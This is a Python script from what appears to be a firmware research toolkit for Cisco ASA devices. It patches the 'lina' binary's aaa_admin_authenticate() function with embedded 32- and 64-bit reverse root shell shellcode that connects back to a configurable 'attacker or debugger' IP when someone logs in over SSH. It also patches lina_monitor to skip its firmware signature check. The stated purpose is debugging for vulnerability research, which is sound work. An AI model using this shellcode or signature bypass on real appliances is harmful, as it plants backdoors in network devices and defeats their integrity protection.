#!/usr/bin/env python3
#
# This file is part of asafw.
# Copyright (c) 2017, Aaron Adams <aaron.adams(at)nccgroup(dot)trust>
# Copyright (c) 2017, Cedric Halbronn <cedric.halbronn(at)nccgroup(dot)trust>
#
# This script carries out two different sets of patches. The first one is always
# installed, the second one is optionally installed if requested to.
#
# The reverse debug shell payloads are based on those provided by Exodus Intelligence
# in their CVE-2016-1287 exploit: 
# https://github.com/exodusintel/disclosures/blob/master/CVE_2016_1287_PoC
# but we also provide a 64-bit version :)
#
## Number 1
# Patch a "lina" binary aaa_admin_authenticate() function to do a Linux connect
# back to us to allow us to analyze anything we want. We name this a "debug shell"
# (such as /proc/<pid_lina>/maps, etc.)
# Supports both 32-bit and 64-bit lina
#

import array
import hexdump
import socket
import sys
import struct
import string
import random
import time
import re
import binascii
import pickle, argparse, os, json
import platform
import subprocess
import pprint
from helper import *

def logmsg(s):
    if type(s) == str:
        print("[lina] " + s)
    else:
        print(s)

# Spawns a Linux root shell (connect back)
# To format in vim visual select hex strings and run :
# '<,'>s/\(\(\\x..\)\{16\}\)/"\1"\r/g
sc_debug_shell_32 = (
b"\xb8\x77\x77\x77\x77\xff\xd0\xb8\x02\x00\x00\x00\xcd\x80\x85\xc0"
b"\x0f\x85\xa1\x01\x00\x00\xba\xed\x01\x00\x00\xb9\xc2\x00\x00\x00"
b"\x68\x2f\x73\x68\x00\x68\x2f\x74\x6d\x70\x8d\x1c\x24\xb8\x05\x00"
b"\x00\x00\xcd\x80\x50\xeb\x31\x59\x8b\x11\x8d\x49\x04\x89\xc3\xb8"
b"\x04\x00\x00\x00\xcd\x80\x5b\xb8\x06\x00\x00\x00\xcd\x80\x8d\x1c"
b"\x24\x31\xd2\x52\x53\x8d\x0c\x24\xb8\x0b\x00\x00\x00\xcd\x80\x31"
b"\xdb\xb8\x01\x00\x00\x00\xcd\x80\xe8\xca\xff\xff\xff\x46\x01\x00"
b"\x00\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00"
b"\x00\x02\x00\x03\x00\x01\x00\x00\x00\x54\x80\x04\x08\x34\x00\x00"
b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x00"
b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04"
b"\x08\x00\x80\x04\x08\xf2\x00\x00\x00\xf2\x00\x00\x00\x07\x00\x00"
b"\x00\x00\x10\x00\x00\x55\x89\xe5\x83\xec\x10\x6a\x00\x6a\x01\x6a"
b"\x02\x8d\x0c\x24\xbb\x01\x00\x00\x00\xb8\x66\x00\x00\x00\xcd\x80"
b"\x83\xc4\x0c\x89\x45\xfc\x68\x7f\x00\x00\x01\x68\x02\x00\x04\x38"
b"\x8d\x14\x24\x6a\x10\x52\x50\x8d\x0c\x24\xbb\x03\x00\x00\x00\xb8"
b"\x66\x00\x00\x00\xcd\x80\x83\xc4\x14\x85\xc0\x7d\x18\x6a\x00\x6a"
b"\x01\x8d\x1c\x24\x31\xc9\xb8\xa2\x00\x00\x00\xcd\x80\x83\xc4\x08"
b"\xeb\xc4\x8b\x45\xfc\x83\xec\x20\x8d\x0c\x24\xba\x03\x00\x00\x00"
b"\x8b\x5d\xfc\xc7\x01\x05\x01\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"
b"\xba\x04\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xc7\x01\x05\x01"
b"\x00\x01\xc7\x41\x04\xaa\xbb\xcc\xdd\x66\xc7\x41\x08\x88\x88\xba"
b"\x0a\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\xba\x20\x00\x00\x00"
b"\xb8\x03\x00\x00\x00\xcd\x80\x83\xc4\x20\x8b\x5d\xfc\xb9\x02\x00"
b"\x00\x00\xb8\x3f\x00\x00\x00\xcd\x80\x49\x7d\xf6\x31\xd2\x68\x2d"
b"\x69\x00\x00\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89"
b"\xe3\x52\x57\x53\x8d\x0c\x24\xb8\x0b\x00\x00\x00\xcd\x80\x31\xdb"
b"\xb8\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xc3")

sc_debug_shell_64 = (
b"\x55\x53\x41\x54\x41\x55\x41\x56\x41\x57\x48\xb8\x77\x77\x77\x77"
b"\x77\x77\x77\x77\xff\xd0\x48\xc7\xc0\x39\x00\x00\x00\x0f\x05\x48"
b"\x85\xc0\x0f\x85\xc2\x01\x00\x00\x48\xc7\xc2\xed\x01\x00\x00\x48"
b"\xc7\xc6\xc2\x00\x00\x00\x48\x83\xec\x08\x48\x8d\x3c\x24\xc7\x07"
b"\x2f\x74\x6d\x70\xc7\x47\x04\x2f\x73\x68\x00\x48\xc7\xc0\x02\x00"
b"\x00\x00\x0f\x05\x50\xeb\x40\x59\x48\x8b\x11\x48\x8d\x71\x08\x48"
b"\x89\xc7\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x5f\x48\xc7\xc0\x03"
b"\x00\x00\x00\x0f\x05\x48\x8d\x3c\x24\x48\x31\xd2\x52\x57\x48\x8d"
b"\x34\x24\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7"
b"\xc0\x3c\x00\x00\x00\x0f\x05\xe8\xbb\xff\xff\xff\x46\x01\x00\x00"
b"\x00\x00\x00\x00\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00"
b"\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x54\x80\x04\x08"
b"\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00"
b"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
b"\x00\x80\x04\x08\x00\x80\x04\x08\xf2\x00\x00\x00\xf2\x00\x00\x00"
b"\x07\x00\x00\x00\x00\x10\x00\x00\x55\x89\xe5\x83\xec\x10\x6a\x00"
b"\x6a\x01\x6a\x02\x8d\x0c\x24\xbb\x01\x00\x00\x00\xb8\x66\x00\x00"
b"\x00\xcd\x80\x83\xc4\x0c\x89\x45\xfc\x68\x7f\x00\x00\x01\x68\x02"
b"\x00\x04\x38\x8d\x14\x24\x6a\x10\x52\x50\x8d\x0c\x24\xbb\x03\x00"
b"\x00\x00\xb8\x66\x00\x00\x00\xcd\x80\x83\xc4\x14\x85\xc0\x7d\x18"
b"\x6a\x00\x6a\x01\x8d\x1c\x24\x31\xc9\xb8\xa2\x00\x00\x00\xcd\x80"
b"\x83\xc4\x08\xeb\xc4\x8b\x45\xfc\x83\xec\x20\x8d\x0c\x24\xba\x03"
b"\x00\x00\x00\x8b\x5d\xfc\xc7\x01\x05\x01\x00\x00\xb8\x04\x00\x00"
b"\x00\xcd\x80\xba\x04\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xc7"
b"\x01\x05\x01\x00\x01\xc7\x41\x04\xaa\xbb\xcc\xdd\x66\xc7\x41\x08"
b"\x88\x88\xba\x0a\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80\xba\x20"
b"\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\x83\xc4\x20\x8b\x5d\xfc"
b"\xb9\x02\x00\x00\x00\xb8\x3f\x00\x00\x00\xcd\x80\x49\x7d\xf6\x31"
b"\xd2\x68\x2d\x69\x00\x00\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62"
b"\x69\x6e\x89\xe3\x52\x57\x53\x8d\x0c\x24\xb8\x0b\x00\x00\x00\xcd"
b"\x80\x31\xdb\xb8\x01\x00\x00\x00\xcd\x80\x41\x5f\x41\x5e\x41\x5d"
b"\x41\x5c\x5b\x5d\x48\xc7\xc0\x01\x00\x00\x00\xc3")

# Builds a Linux reverse shell payload based on some parameters
# like information for a target and a host/port to connect to
class LinuxReverseShell(object):
    def __init__(self, c):
        self._revHost           = c["revHost"]
        self._revPort           = c["revPort"]
        self._target            = c["target"]
        self._missingSymbols    = []
        self._shellcode         = None

    def replaceSymbol(self, pattern, symbolname, mask=0xffffffffffffffff, 
            use_slide=True):
        slide = 0x0
        if use_slide:
            slide = self._target["lina_imagebase"]
        if len(pattern) == 4:
            fmt = "<I"
        elif len(pattern) == 8:
            fmt = "<Q"
        else:
            logmsg("[x] Unsupported pattern length yet")
            sys.exit()
        if type(symbolname) == list:
            bFound = False
            for s in symbolname:
                try:
                    addr = self._target['addresses'][s] & mask
                    self._shellcode = self._shellcode.replace(pattern, \
                            struct.pack(fmt, (slide + addr)))
                except KeyError:
                    continue
                else:
                    bFound = True
                    break
            if not bFound:
                self._missingSymbols.append(symbolname)
        else:
            try:
                addr = self._target['addresses'][symbolname] & mask
                self._shellcode = self._shellcode.replace(pattern, 
                        struct.pack(fmt, (slide + addr)))
            except KeyError:
                self._missingSymbols.append(symbolname)

    def buildShellcode(self):
        if self._target["arch"] == 64:
            self._shellcode = sc_debug_shell_64
            self.replaceSymbol(b'\x77\x77\x77\x77\x77\x77\x77\x77', 
                ['start_loopback_proxy', 'socks_proxy_server_start'])
        else:
            self._shellcode = sc_debug_shell_32
            self.replaceSymbol(b'\x77\x77\x77\x77', 
                ['start_loopback_proxy', 'socks_proxy_server_start'])
        # XXX clean this 
        self._shellcode = self._shellcode.replace(b'\xaa\xbb\xcc\xdd', 
                socket.inet_aton(self._revHost)).replace(b'\x88\x88', 
                    struct.pack(">H", self._revPort))
        if len(self._missingSymbols) == 0:
            return True
        else:
            return False

# Inject a debug shell into "lina" by patching the aaa_admin_authenticate()
# function. It allows triggering it when connecting over SSH
def inject_debug_shell(config, indata, scratch_off):
    logmsg("Installing debug shell at 0x%x" % scratch_off)
    c = config
    rev = LinuxReverseShell(c)
    if rev.buildShellcode() != True:
        logmsg("Target not completely supported yet. Missing symbols:")
        logmsg(rev._missingSymbols)
        sys.exit(1)

    # on asa924-k8.bin, aaa_admin_authenticate is 2593 bytes so we have plenty
    # of room
    patched_func_len = len(rev._shellcode)
    if patched_func_len > 1000:
        logmsg("Error: Looks like shellcode is quite big, something wrong?")
        sys.exit(1)

    lina_data = indata[:scratch_off] + rev._shellcode \
               + indata[scratch_off+patched_func_len:]
    logmsg("Patched lina offset: 0x%x with len = %d bytes (DEBUG SHELL)" % 
            (scratch_off, patched_func_len))

    return (lina_data, scratch_off+patched_func_len)

# Patch jump for lina's signature check in lina_monitor
# e.g. asav962-7
# .text:000000000000395B E8 30 1D 00+   call    code_sign_verify_signature_image
# .text:0000000000003960 85 C0          test    eax, eax
# .text:0000000000003962 89 C3          mov     ebx, eax
# .text:0000000000003964 74 50          jz      short loc_39B6
# Patch is to replace:
# jz short loc_39B6 == "74 50" == je 0x52
# by:
# jmp 0x52 == "eb 50"
def patch_lina_signature_check(config, indata, scratch_off):
    logmsg("Patching lina signature check at 0x%x" % scratch_off)
    c = config
    
    if indata[scratch_off:scratch_off+1] != b"\x74":
        logmsg("Error: Opcode not supported. We only support jz for now: Found: 0x%x" % ord(indata[scratch_off:scratch_off+1]))
        sys.exit(1)
    
    outdata = indata[:scratch_off] + b"\xeb" \
               + indata[scratch_off+1:]
    logmsg("Patched lina_monitor offset: 0x%x with len = 1 bytes (SIGN CHECK)" % 
            (scratch_off))

    return outdata

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', dest='cbhost', default='192.168.210.78', \
                        help="Attacker or debugger IP addr for reverse shell")
    parser.add_argument('-p', dest='cbport', type=int, default=4444, \
                        help="Attacker or debugger port for reverse shell")
    parser.add_argument('-i', dest='target_index', default=None, \
                        help="Index of the target (use info.py -l to list them all)")
    parser.add_argument('-f', dest='lina_file', default=None, \
                        help="Input lina file")
    parser.add_argument('-F', dest='lina_monitor_file', default=None, \
                        help="Input lina_monitor file (only in ASAv 64-bit)")
    parser.add_argument('-b', dest='bin_name', default=None, \
                        help="Input bin name")
    parser.add_argument('-o', dest='lina_file_out', default=None, \
                        help="Output lina file")
    parser.add_argument('-O', dest='lina_monitor_file_out', default=None, \
                        help="Output lina_monitor file (only in ASAv 64-bit)")
    parser.add_argument('-v', dest='verbose', default=False, 
            action="store_true", help="Display more info")
    parser.add_argument('-d', dest='target_file', default=None, 
                        help='JSON db name')
    args = parser.parse_args()

    if args.target_file == None:
        logmsg("You need to specify a JSON database filename with -d")
        sys.exit(1)
    if args.lina_file == None:
        logmsg("You need to specify an input lina file with -f")
        sys.exit(1)
    if args.lina_file_out == None:
        logmsg("You need to specify an output lina file with -o")
        sys.exit(1)

    # setup config
    c = {}
    c["revPort"]        = int(args.cbport)    # This is for debug shell only
    c["revHost"]        = args.cbhost
    c["target_file"]    = args.target_file
    c["lina_in"]        = args.lina_file
    c["lina_out"]       = args.lina_file_out

    targets = load_targets(c["target_file"])
    target_index = args.target_index
    if target_index == None:
        if args.bin_name != None:
            bin_name = args.bin_name
        else:
            logmsg("WARN: No index or firmware name specified. Will guess based on lina path...")
            bin_name = build_bin_name(args.lina_file)
            if not bin_name:
                logmsg("[x] Failed to guess target")
                sys.exit(1)
        target_index = get_target_index(targets, bin_name)
        if target_index == None:
            logmsg("[x] Failed to get target index matching bin name")
            sys.exit(1)
    index = int(target_index)
    logmsg("Using index: %d for %s" % (index, bin_name))
    if index >= len(targets):
        logmsg("Error: Bad target index")
        sys.exit(1)
    c["target"]   = targets[index]
    
    # let's patch lina_monitor (supported/required for ASAv only afaict)
    if c["target"]["fw"].startswith("asav"):
        if args.lina_monitor_file == None:
            logmsg("You need to specify an input lina_monitor file with -F")
            sys.exit(1)
        if args.lina_monitor_file_out == None:
            logmsg("You need to specify an output lina_monitor file with -O")
            sys.exit(1)

        logmsg("Input lina_monitor file: %s" % args.lina_monitor_file)
        lm_data = open(args.lina_monitor_file, 'rb').read()
        logmsg("Size of unpatched lina_monitor: %d bytes" % len(lm_data))

        # relative offset in memory is actual offset in ELF
        try:
            sign_check_jz_offset = c["target"]["lm_addresses"]["jz_after_code_sign_verify_signature_image"]
        except KeyError:
            logmsg("Error: can't find jz_after_code_sign_verify_signature_image, you need to add symbol with asadbg_rename.py/asadbg_hunt.py first")
            sys.exit(1)
           
        lm_data = patch_lina_signature_check(c, lm_data, sign_check_jz_offset)
    
        open(args.lina_monitor_file_out, 'wb').write(lm_data)
        logmsg("Output lina_monitor file: %s" % args.lina_monitor_file_out)

    # let's patch lina (and glibc for ASAv)

    # we need a valid imagebase so the offset in the ELF is right
    if c["target"]["lina_imagebase"] == 0:
        logmsg("Error: Looks like aaa_admin_authenticate will be wrong")
        sys.exit(1)
    # relative offset in memory is actual offset in ELF
    try:
        aaa_admin_auth_offset = c["target"]["addresses"]["aaa_admin_authenticate"]
    except KeyError:
        logmsg("Error: can't find aaa_admin_authenticate, you need to add symbol with asafw first")
        sys.exit(1)
    scratch_off = aaa_admin_auth_offset

    logmsg("Input lina file: %s" % args.lina_file)
    lina_data = open(args.lina_file, 'rb').read()
    logmsg("Size of unpatched lina: %d bytes" % len(lina_data))

    lina_data, scratch_off = inject_debug_shell(c, lina_data, scratch_off)

    open(args.lina_file_out, 'wb').write(lina_data)
    logmsg("Output lina file: %s" % args.lina_file_out)

if __name__ == '__main__':
    main()
